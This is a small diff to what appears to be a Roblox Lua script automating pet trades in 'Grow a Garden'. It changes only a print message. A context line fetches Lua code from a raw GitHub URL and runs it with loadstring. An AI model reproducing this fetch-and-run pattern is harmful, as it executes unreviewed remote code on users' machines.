@@ -199,7 +199,7 @@ task.spawn(function()
                             print("Not Found Master Active!")
                         end
                     else
-                        print("Not Pet Target!")
+                        print("Not Pet In Target!")
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/Achitsak/zapzone/main/loader/scripts/grow_a_garden.lua"))()
 						task.wait(60)
 						_G.Is_Trade = false
